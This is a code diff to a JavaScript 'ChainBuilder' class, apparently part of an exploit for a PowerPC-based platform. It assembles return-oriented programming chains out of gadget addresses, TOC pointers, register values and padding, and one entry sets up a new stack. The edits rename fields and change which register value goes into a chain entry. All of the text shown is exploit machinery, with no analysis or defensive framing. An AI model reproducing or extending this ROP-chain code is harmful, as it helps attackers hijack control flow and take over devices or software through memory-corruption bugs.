@@ -200,7 +200,7 @@ class ChainBuilder {
 		
 		var minFrameSize = 0x20;
 		if (frameSize < minFrameSize) {
-			throw new Error("ChainBuilder.callsub(): frame size is too small");	
+			throw new Error("ChainBuilder#callsub(): frame size is too small");	
 		}
 		
 		r31in = r31in || this.gtemp;
@@ -240,14 +240,14 @@ class ChainBuilder {
 		
 		this.appendChainParamInt64(r3);
 		
-		// blr to address
+		// Return to sub
 		this.appendChain(	
 			//////////
 			
 			Util.pad(0x10, SF)
 			+ Util.int64(0x0, this.offsets.gadgetMod2)
 			+ Util.pad(0x60, AA)
-			+ Util.int64(0x0, this.gtemp)
+			+ Util.int64(0x0, r31in)
 			
 			//////////
 			
@@ -345,7 +345,7 @@ class ChainBuilder {
 		this.dataOffsets['opdGadgetZ1'] = this.getDataCurrentOffset();
 		this.appendData(
 			Util.int32(this.offsets.gadgetZ1)
-			+ Util.int32(this.offsets.addrToc)
+			+ Util.int32(this.offsets.toc)
 		);
 		
 		//////////
@@ -353,9 +353,9 @@ class ChainBuilder {
 		this.appendChain(
 			// Set up our new stack
 			Util.int32(this.offsets.gadget1)
-			+ Util.int32(this.offsets.addrToc)
+			+ Util.int32(this.offsets.toc)
 			+ Util.pad(0x20, AA)
-			+ Util.int64(0x0, this.offsets.addrToc)
+			+ Util.int64(0x0, this.offsets.toc)
 			+ Util.pad(0x60, AA)
 			
 			//////////
